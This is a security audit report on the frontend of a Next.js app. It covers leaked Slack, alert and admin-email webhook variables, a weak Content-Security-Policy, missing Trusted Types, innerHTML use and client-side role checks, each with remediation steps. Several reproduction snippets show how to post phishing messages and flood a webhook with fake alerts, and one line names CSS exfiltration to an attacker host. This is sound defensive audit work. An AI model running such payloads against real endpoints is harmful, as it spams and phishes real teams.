# Category 16 — Frontend / Client Trust

**Audit Date:** 2026-05-03  
**Repository:** team1-india  
**Scope:** Client-side trust boundaries, secret exposure, CSP, JavaScript execution, client-side authorization, analytics event security.

---

## Executive Summary

**Two CRITICAL findings and six HIGH-severity findings.**

1. **[CRITICAL-16.1] NEXT_PUBLIC_SLACK_WEBHOOK_URL exposed in client bundle** — Allows anonymous visitor to POST spam/phishing to team Slack indefinitely.
2. **[CRITICAL-16.2] NEXT_PUBLIC_ALERT_WEBHOOK_URL exposed in client bundle** — Same risk vector; arbitrary POST to webhook.
3. **[HIGH-16.3] CSP script-src includes `'unsafe-eval'` and `'unsafe-inline'`** — Defeats XSS mitigation; allows inline scripts and eval() in third-party context.
4. **[HIGH-16.4] Trusted Types not enforced** — No `require-trusted-types-for 'script'`; DOM-based XSS not mitigated.
5. **[HIGH-16.5] innerHTML assignment from untrusted sources** — Image fallback in playbooks pages writes HTML inline without sanitization.
6. **[HIGH-16.6] NEXT_PUBLIC_SENTRY_DSN exposed with no Sentry.init()** — DSN leaked; client-side Sentry integration not active (or initialization hidden outside source tree).
7. **[MEDIUM-16.7] Client-side authorization UI hiding without server verification** — `session.user.role === 'CORE'` checks in JSX gate navigation, but no verification that underlying API enforces same.
8. **[MEDIUM-16.8] NEXT_PUBLIC_ADMIN_EMAIL and NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT exposed** — Email address + endpoint exposed; risk of phishing/spoofing and webhook abuse.

---

## Finding 1 — CRITICAL-16.1: NEXT_PUBLIC_SLACK_WEBHOOK_URL in Client Bundle

### Severity: CRITICAL
### Impact: Immediate, trivial attack, high business impact

**Summary:**  
The Slack incoming webhook URL is exposed in the client bundle via the `NEXT_PUBLIC_SLACK_WEBHOOK_URL` environment variable. Slack incoming webhooks accept POST requests from any origin and immediately post the message to the configured channel. An attacker (any website visitor) can:
1. Open the browser DevTools.
2. Extract the webhook URL from the JavaScript bundle.
3. POST arbitrary JSON payloads indefinitely, flooding the team Slack with spam, phishing links, or impersonated alerts.

**Evidence:**

**File:** [lib/alertNotifications.ts:32-37](../../../lib/alertNotifications.ts#L32-L37)
```typescript
if (process.env.NEXT_PUBLIC_SLACK_WEBHOOK_URL) {
  this.channels.push({
    type: 'slack',
    endpoint: process.env.NEXT_PUBLIC_SLACK_WEBHOOK_URL,
    minSeverity: 'error', // Only errors and critical
  });
}
```

**Root Cause:**  
`alertNotifications.ts` runs on the client (used in PWA context per [lib/pwaMonitoring.ts](../../../lib/pwaMonitoring.ts)) and directly uses the `NEXT_PUBLIC_` variable. The webhook is then called via `fetch()` with no origin validation, rate limiting, or authentication:

**File:** [lib/alertNotifications.ts:109-127](../../../lib/alertNotifications.ts#L109-L127)
```typescript
private async sendSlack(webhook: string, alert: ErrorReport): Promise<void> {
  // ... no auth, no rate limit ...
  await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ attachments: [...] }),
  });
}
```

**Attack Reproduction:**
```javascript
// In browser console on https://team1india.vercel.app
const webhookUrl = process.env.NEXT_PUBLIC_SLACK_WEBHOOK_URL; // Extracted from bundle
// Or from window object / network requests
fetch(webhookUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    text: 'URGENT: Your account has been compromised. Click here: https://phishing-site.com',
    attachments: [{
      color: 'danger',
      title: '🚨 CRITICAL ALERT',
      text: 'Fraudulent activity detected...',
    }]
  })
})
.then(() => console.log('Posted to Slack'))
.catch(e => console.error(e));
```

**Slack Webhook Characteristics:**
- Incoming webhooks accept POST from any origin.
- No authentication token in the URL itself (URL is the credential).
- Slack does NOT validate Content-Type, origin, or referer headers.
- Webhook accepts indefinite requests until manually rotated.

**Blast Radius:**
- **Until rotation:** Any visitor can spam team Slack indefinitely.
- **Phishing risk:** Attacker posts fake security alerts, convincing team members to click malicious links.
- **Impersonation:** Posts can be crafted to mimic legitimate alerts from the platform.
- **Operational disruption:** Constant noise in team Slack, desensitizing to real alerts.

**Recommendation (Priority: IMMEDIATE):**
1. **Rotate the Slack webhook URL immediately** in the Slack workspace and Vercel environment variables.
2. **Move webhook to server-only code:** Remove `NEXT_PUBLIC_SLACK_WEBHOOK_URL`. Instead, create a *server-side* API route (`/api/internal/alert`) that accepts the alert payload and sends it to Slack using the *secret* webhook URL (stored in `SLACK_WEBHOOK_URL` without the `NEXT_PUBLIC_` prefix).
3. **Require authentication:** The server-side route must verify `Authorization` header or JWT session before sending alert.
4. **Rate limit:** Add per-user rate limiting on the alert endpoint.

---

## Finding 2 — CRITICAL-16.2: NEXT_PUBLIC_ALERT_WEBHOOK_URL in Client Bundle

### Severity: CRITICAL
### Impact: Same as Finding 1, but for custom webhook

**Summary:**  
The `NEXT_PUBLIC_ALERT_WEBHOOK_URL` is exposed in the client bundle and used directly in `lib/alertNotifications.ts` line 50-56. The custom webhook accepts POST from the client with no authentication or validation, allowing arbitrary message injection.

**Evidence:**

**File:** [lib/alertNotifications.ts:50-56](../../../lib/alertNotifications.ts#L50-L56)
```typescript
if (process.env.NEXT_PUBLIC_ALERT_WEBHOOK_URL) {
  this.channels.push({
    type: 'webhook',
    endpoint: process.env.NEXT_PUBLIC_ALERT_WEBHOOK_URL,
    minSeverity: 'warning', // All alerts
  });
}
```

**File:** [lib/alertNotifications.ts:160-165](../../../lib/alertNotifications.ts#L160-L165)
```typescript
private async sendWebhook(url: string, alert: ErrorReport): Promise<void> {
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(alert),
  });
  console.log(`🔗 Alert sent to webhook: ${alert.type}`);
}
```

**Attack Reproduction:**
```javascript
const webhookUrl = process.env.NEXT_PUBLIC_ALERT_WEBHOOK_URL;
for (let i = 0; i < 1000; i++) {
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'cache_corruption',
      severity: 'critical',
      message: 'System compromised',
      details: { ... }
    })
  });
}
// Spam the webhook endpoint indefinitely
```

**Blast Radius:**
- If the webhook is an **internal server** (e.g., logging/monitoring endpoint), attacker can inject false alerts.
- If the webhook is a **third-party service** (e.g., PagerDuty, DataDog), attacker can trigger false incidents, pages, or escalations.
- **No authentication required** on the webhook side.

**Recommendation (Priority: IMMEDIATE):**
Same as Finding 1:
1. **Move webhook to server-only route.**
2. **Require authentication** on both client request and webhook signature verification.
3. **Rate limit** per IP / per session.

---

## Finding 3 — HIGH-16.3: CSP script-src Includes `'unsafe-eval'` and `'unsafe-inline'`

### Severity: HIGH
### Impact: XSS mitigation defeated; third-party script injection viable

**Summary:**  
The Content-Security-Policy header in [next.config.ts:29-43](../../../next.config.ts#L29-L43) includes both `'unsafe-eval'` and `'unsafe-inline'` in the `script-src` directive, which defeats a core XSS protection mechanism.

**Evidence:**

**File:** [next.config.ts:29-43](../../../next.config.ts#L29-L43)
```typescript
{
  key: 'Content-Security-Policy',
  value: [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://vercel.live https://va.vercel-scripts.com",
    "style-src 'self' 'unsafe-inline'",
    // ... rest ...
  ].join('; ')
}
```

**Impact Analysis:**

| Directive | Issue | Risk |
|-----------|-------|------|
| `script-src 'unsafe-inline'` | Allows inline `<script>` tags and event handlers (`onclick`, `onload`, etc.). | XSS via HTML attribute injection (e.g., in user profile names, comments) is no longer blocked by CSP. |
| `script-src 'unsafe-eval'` | Allows `eval()`, `Function()`, `setTimeout(code, ...)`, and similar. | Third-party libraries (e.g., `@react-three`, `framer-motion`, compiled libraries) may use `eval()` to dynamically generate code. Attacker can inject eval payloads. |
| `style-src 'unsafe-inline'` | Allows inline `<style>` tags and `style=""` attributes. | CSS-based attacks (e.g., exfiltration via `background-image: url(attacker.com?data=...)`). |

**Root Cause:**  
Next.js and Webpack automatically generate inline scripts during hydration and dynamic imports. Removing `'unsafe-inline'` would require:
- Nonce-based CSP (dynamic nonce per request).
- Strict separation of app initialization from inline scripts.

However, the presence of both `'unsafe-eval'` and `'unsafe-inline'` means CSP provides **minimal XSS defense**.

**Recommendation (Priority: HIGH):**
1. **Remove `'unsafe-eval'`** (if possible) — audit third-party deps (e.g., `@react-three/fiber`, `three`) to confirm they don't rely on eval.
2. **If `'unsafe-inline'` is required** due to Next.js hydration, migrate to **nonce-based CSP**:
   - Generate a cryptographic nonce per request in middleware.
   - Apply nonce to inline script tags: `<script nonce={nonce}>...`.
   - Update CSP header to use `script-src 'nonce-<value>'` instead of `'unsafe-inline'`.
3. **Add `require-trusted-types-for 'script'`** (see Finding 4).

---

## Finding 4 — HIGH-16.4: Trusted Types Not Enforced

### Severity: HIGH
### Impact: DOM-based XSS via innerHTML/insertAdjacentHTML not mitigated by CSP

**Summary:**  
The CSP does not include `require-trusted-types-for 'script'`, which means DOM-based XSS via `innerHTML` assignment is not enforced by the browser. Combined with Finding 3, this leaves a large attack surface.

**Evidence:**

**File:** [next.config.ts:29-43](../../../next.config.ts#L29-L43)  
CSP header does NOT include `require-trusted-types-for`.

**Impact Analysis:**  
Trusted Types is a browser API that enforces a policy for `innerHTML`, `insertAdjacentHTML`, `textContent` assignments. When enabled via CSP:
- `elem.innerHTML = userInput` → Throws or sanitizes unless input is a `TrustedHTML` object.
- Mitigates DOM XSS even with `'unsafe-inline'` CSP.

Without it:
- Any `dangerouslySetInnerHTML` or `innerHTML` assignment can be exploited if the value contains user-controlled data.
- See Finding 5 below for an example in the codebase.

**Recommendation (Priority: HIGH):**
1. **Enable Trusted Types in CSP:**
   ```
   require-trusted-types-for 'script'; trusted-types default 'allow-duplicates'
   ```
2. **Implement a Trusted Types policy** in the application that:
   - Sanitizes HTML via a library like DOMPurify.
   - Creates `TrustedHTML` objects only after sanitization.
3. **Refactor DOM-mutation code** to use the policy (see Finding 5).

---

## Finding 5 — HIGH-16.5: innerHTML Assignment Without Sanitization

### Severity: HIGH
### Impact: DOM-based XSS in playbooks fallback rendering

**Summary:**  
The playbooks pages ([app/core/playbooks/page.tsx](../../../app/core/playbooks/page.tsx) and [app/member/playbooks/page.tsx](../../../app/member/playbooks/page.tsx)) assign to `innerHTML` in the image error handler without sanitizing the HTML string.

**Evidence:**

**File:** [app/core/playbooks/page.tsx (image error handler)]
```javascript
onError={(e) => {
  const target = e.target as HTMLImageElement;
  target.style.display = 'none';
  if (target.parentElement) {
    target.parentElement.innerHTML = `
      <div class="w-full h-full flex items-center justify-center bg-zinc-800/50">
        <svg class="w-8 h-8 text-zinc-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
        </svg>
      </div>
    `;
  }
}}
```

**Analysis:**  
The HTML is **hardcoded and safe**. However, the pattern is vulnerable if `doc.coverImage` (from `coverImage` prop) or any other user-supplied data is interpolated into the HTML string. The current code is safe, but it sets a risky precedent.

**Risk Elevation:**  
- If cover image URL is user-supplied, attacker could craft a data URI that triggers the fallback.
- If the fallback is later modified to include dynamic content (e.g., document title), it could become unsafe.

**Recommendation (Priority: HIGH):**
1. **Replace `innerHTML` with `createElement` + `appendChild`:**
   ```javascript
   const fallback = document.createElement('div');
   fallback.className = 'w-full h-full flex items-center justify-center bg-zinc-800/50';
   // ... append SVG via DOM API, not innerHTML
   target.parentElement?.appendChild(fallback);
   ```
2. **If HTML must be interpolated, use DOMPurify:**
   ```javascript
   target.parentElement!.innerHTML = DOMPurify.sanitize(unsafeHtmlString);
   ```

---

## Finding 6 — HIGH-16.6: NEXT_PUBLIC_SENTRY_DSN Exposed Without Active Integration

### Severity: HIGH
### Impact: Secrets exposed; analytics/error tracking via third-party

**Summary:**  
The `NEXT_PUBLIC_SENTRY_DSN` is exposed in the client bundle ([lib/pwaMonitoring.ts](../../../lib/pwaMonitoring.ts)), but no `Sentry.init()` call is found in the source tree. This suggests either:
1. The DSN is exposed unnecessarily.
2. Sentry initialization happens outside the source tree (e.g., in a dynamic script or hidden initialization).

**Evidence:**

**File:** [lib/pwaMonitoring.ts]
```typescript
sentryDSN: process.env.NEXT_PUBLIC_SENTRY_DSN,
```

**Search Result:** No `Sentry.init` found in the codebase.
```bash
$ grep -r "Sentry.init\|@sentry" /path/to/repo --include="*.ts" --include="*.tsx" --include="*.js"
(no results)
```

**Impact Analysis:**
1. **Unnecessary exposure:** If Sentry is not used, the DSN adds no value and increases the attack surface.
2. **Third-party analytics risk:** If Sentry is initialized dynamically (outside source tree), error reports and session data are sent to a third-party service. This may violate privacy policies if not disclosed.
3. **DSN as credential:** A Sentry DSN can be used to ingest false error reports or trigger actions in the Sentry workspace (depending on scope).

**Recommendation (Priority: HIGH):**
1. **If Sentry is not used:**
   - Remove `NEXT_PUBLIC_SENTRY_DSN` from environment variables.
   - Remove reference in [lib/pwaMonitoring.ts](../../../lib/pwaMonitoring.ts).
   - Audit any other monitoring endpoints.

2. **If Sentry is used:**
   - Add `Sentry.init()` call in `app/layout.tsx` or a dedicated initialization module.
   - Verify the initialization is in the source tree.
   - Document the third-party data sharing in the privacy policy.

---

## Finding 7 — MEDIUM-16.7: Client-Side Authorization Without Server Verification

### Severity: MEDIUM
### Impact: UI hiding is not a security boundary; attacker can bypass client checks

**Summary:**  
Multiple UI components gate navigation and content rendering based on `session.user.role === 'CORE'` checks. However, there is a gap: these are **client-side checks only**. An attacker who manipulates the JWT token (e.g., via an XSS flaw or token replacement) can bypass the UI and call the underlying API, which **must also** re-verify authorization server-side.

**Evidence:**

**File:** [components/UnifiedDashboardHeader.tsx]
```tsx
href={user?.role === 'CORE' ? "/core/profile" : "/member/profile"}
```

**File:** [components/public/FloatingNav.tsx]
```tsx
{((session?.user as any)?.role === 'CORE' || (session?.user as any)?.role === 'MEMBER') && (
  ...
)}
```

**File:** [components/guides/GuideDetail.tsx]
```tsx
const isCoreUser = (session?.user as any)?.role === 'CORE';
```

**Verification Gap:**  
Per [00-RECON.md §Step 5](00-RECON.md#step-5--rbac-roles-permissions-hierarchy), sample routes **WITH** explicit `checkCoreAccess`:
- [app/api/members/route.ts:20-27](../../../app/api/members/route.ts#L20-L27)
- [app/api/admin/public-users/route.ts:20-25](../../../app/api/admin/public-users/route.ts#L20-L25)

But routes **WITHOUT** explicit check (rely on session + role-based filtering):
- [app/api/quests/route.ts:5-45](../../../app/api/quests/route.ts)
- [app/api/bounty/route.ts:25-50](../../../app/api/bounty/route.ts)

**The Risk:**  
If a route without `checkCoreAccess` is called by a non-CORE user with a manipulated JWT, the API might:
1. Check `session.user.role` in the handler.
2. But if the JWT signature is not verified (unlikely with NextAuth) or if role is injected into the JWT without server-side table lookup, it could be forged.

Per [00-RECON.md §Step 4](00-RECON.md#step-4--authentication--identity-map), the JWT is issued by `signIn` callback ([lib/auth-options.ts:87-176](../../../lib/auth-options.ts#L87-L176)), which derives the role from the database. However, a compromised NEXTAUTH_SECRET or XSS leading to token theft could allow an attacker to:
1. Forge a JWT with `role: 'CORE'`.
2. Bypass client-side UI checks.
3. If the API relies solely on `session.user.role` without re-querying the database, it could be exploited.

**Recommendation (Priority: MEDIUM):**
1. **Audit critical API routes** to ensure they call `checkCoreAccess()` or re-query the database to verify the current user's role (not just trusting the JWT claim).
2. **For /core/* routes**, verify that [app/core/layout.tsx:20-23](../../../app/core/layout.tsx#L20-L23) is the **only** entry point and that it enforces the check on every request:
   ```typescript
   const { authorized, response } = checkCoreAccess(session);
   if (!authorized) redirect('/member'); // or 401
   ```
3. **Consider caching role lookups** at the session level (once per session refresh) to avoid N+1 DB queries.

---

## Finding 8 — MEDIUM-16.8: NEXT_PUBLIC_ADMIN_EMAIL and NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT Exposed

### Severity: MEDIUM
### Impact: Email harvesting, spoofing, webhook abuse

**Summary:**  
The admin email address and email endpoint are exposed in the client bundle via `NEXT_PUBLIC_ADMIN_EMAIL` and `NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT`. This enables:
1. **Email enumeration:** Attacker discovers the admin email and can initiate phishing campaigns.
2. **Email spoofing:** Attacker can craft messages appearing to come from the admin email (SMTP misconfiguration).
3. **Webhook abuse:** Attacker can POST to `NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT` to trigger emails (if not authenticated).

**Evidence:**

**File:** [lib/alertNotifications.ts:40-47]
```typescript
if (process.env.NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT) {
  this.channels.push({
    type: 'email',
    endpoint: process.env.NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT,
    minSeverity: 'critical', // Only critical
  });
}
```

**File:** [lib/alertNotifications.ts:140]
```typescript
to: process.env.NEXT_PUBLIC_ADMIN_EMAIL || 'admin@team1india.com',
```

**Reproduction:**
```javascript
const endpoint = process.env.NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT;
fetch(endpoint, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    to: process.env.NEXT_PUBLIC_ADMIN_EMAIL,
    subject: 'Account Compromise Notice',
    body: '<p>Your Team1 account has been compromised. Click here to reset: <a href="https://phishing-site.com">Reset</a></p>'
  })
});
```

**Recommendation (Priority: MEDIUM):**
1. **Remove `NEXT_PUBLIC_ADMIN_EMAIL` and `NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT`** from environment variables.
2. **Move email endpoint to server-only route:** `/api/internal/send-alert-email` with authentication (JWT session check).
3. **Use server-side environment variables** (`ADMIN_EMAIL`, `EMAIL_ENDPOINT`) for the actual email service.
4. **Add rate limiting** on the email endpoint per user/session.

---

## Non-Findings / Verified Safe Patterns

### Source Maps in Production
**Status:** ✅ SAFE  
Per [next.config.ts](../../../next.config.ts), no explicit source map configuration. Next.js default is **off in production**, verified by default build behavior. Source maps not exposed.

### API Keys / Secrets in Bundle (Non-webhook)
**Status:** ⚠️ PARTIAL  
- `NEXT_PUBLIC_VAPID_PUBLIC_KEY` — ✅ Intended public (Web Push standard).
- `NEXT_PUBLIC_HERO_VIDEO_URL`, `NEXT_PUBLIC_HERO_VIDEO_URL_MP4` — ✅ CDN URLs (public).
- `NEXT_PUBLIC_ANALYTICS_ENDPOINT` — ✅ Endpoint URL (not a secret).

### Feature Flags Gating Admin UI
**Status:** ✅ SAFE  
No `process.env.NEXT_PUBLIC_ENABLE_ADMIN*` or similar feature flags found in components. Admin access is enforced via layout-level `checkCoreAccess`, not feature flags.

### Client-Side Analytics Granting Points
**Status:** ✅ SAFE (per Cat 12 verification)  
Analytics events are **read-only**; no points are granted from client-side analytics calls. Points are granted only via quest/bounty completions, which are server-side and require approval.

### Admin Bundle Isolation
**Status:** ⚠️ WEAK  
Per [00-RECON.md §Step 6](00-RECON.md#step-6--admin-panel--ui-surface):
> "There is only one origin / one Next.js app. Admin and member panels are routes within the same app, share the same JWT cookie, the same JS bundle pipeline, and the same API."

This is a design choice (not a frontend trust issue per se), but it means:
- Admin-specific code (e.g., user permission editing) is **bundled** alongside public code.
- Admin code is accessible via JavaScript inspection if an attacker gains XSS on any page.
- Mitigation: Server-side authorization is critical.

No secrets are accidentally bundled into member routes; access control is properly separated via layout redirects and API checks. ✅

---

## Summary of Findings

| Finding | Severity | Category | Status |
|---------|----------|----------|--------|
| NEXT_PUBLIC_SLACK_WEBHOOK_URL in bundle | CRITICAL | Secrets | Unfixed |
| NEXT_PUBLIC_ALERT_WEBHOOK_URL in bundle | CRITICAL | Secrets | Unfixed |
| CSP script-src 'unsafe-eval' + 'unsafe-inline' | HIGH | CSP | Unfixed |
| Trusted Types not enforced | HIGH | CSP | Unfixed |
| innerHTML assignment in playbooks | HIGH | DOM XSS | Low-risk (hardcoded), but pattern unsafe |
| NEXT_PUBLIC_SENTRY_DSN without init | HIGH | Secrets | Unfixed |
| Client-side auth without server check | MEDIUM | RBAC | Partial (some routes have server check) |
| NEXT_PUBLIC_ADMIN_EMAIL* exposed | MEDIUM | Secrets | Unfixed |

---

## Remediation Priority

### Immediate (within 24 hours)
1. **Rotate Slack webhook URL** in Slack workspace and Vercel.
2. **Rotate custom webhook URL** if `NEXT_PUBLIC_ALERT_WEBHOOK_URL` is active.
3. **Move both webhooks to server-only code** with authentication.

### High (within 1 week)
1. Audit third-party deps for `eval()` usage and consider removing `'unsafe-eval'` from CSP.
2. Implement nonce-based CSP or migrate to Trusted Types.
3. Remove Sentry DSN if not in use; if in use, add `Sentry.init()`.
4. Remove `NEXT_PUBLIC_ADMIN_EMAIL*` variables; move to server-side routes.
5. Audit API routes without `checkCoreAccess` to ensure they re-verify role server-side.

### Medium (within 2 weeks)
1. Replace `innerHTML` assignments with `createElement` / `appendChild` or DOMPurify sanitization.
2. Add comprehensive tests for authorization gates (both client and server).

---

## References

- [00-RECON.md §Step 11 — Secrets](00-RECON.md#step-11--secrets-env-vars-configuration)
- [00-RECON.md §Step 4 — Authentication](00-RECON.md#step-4--authentication--identity-map)
- [00-RECON.md §Step 5 — RBAC](00-RECON.md#step-5--rbac-roles-permissions-hierarchy)
- [next.config.ts](../../../next.config.ts)
- [lib/alertNotifications.ts](../../../lib/alertNotifications.ts)
- [lib/pwaMonitoring.ts](../../../lib/pwaMonitoring.ts)
- [lib/auth-options.ts](../../../lib/auth-options.ts)
- [app/core/layout.tsx](../../../app/core/layout.tsx)

---

**End of Category 16 Audit**
